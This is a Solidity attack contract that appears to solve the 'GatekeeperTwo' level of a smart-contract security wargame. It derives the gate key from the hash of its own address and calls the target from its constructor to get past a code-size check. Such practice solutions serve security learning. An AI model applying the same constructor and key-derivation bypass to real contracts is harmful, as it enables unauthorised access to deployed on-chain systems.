// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/GatekeeperTwo.sol";

contract GatekeeperTwoAttack{
    uint64 public a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 public b = type(uint64).max;
    uint64 public c = b - a;
    bytes8 d = bytes8(c);
    bool public e = a ^ c == b; 
    bytes8 public data = bytes8(b - a);
    constructor(address addr) {
        GatekeeperTwo(addr).enter(data);
    }
}
